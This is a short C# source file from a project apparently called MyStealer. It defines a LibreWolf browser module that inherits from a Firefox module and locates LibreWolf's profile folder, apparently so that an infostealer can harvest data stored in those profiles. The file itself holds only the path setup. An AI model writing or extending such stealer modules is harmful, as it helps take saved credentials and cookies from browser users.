using MyStealer.Collector.Modules.Browser;
using System;
using System.IO;

namespace MyStealer.Collector.Modules.Browser.FirefoxBased
{
    public class LibreWolf : Firefox
    {
        public override string ModuleName => "LibreWolf";

        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "librewolf", "Profiles");

        public override string[] LibDirectory => new string[] { "LibreWolf" };
    }
}
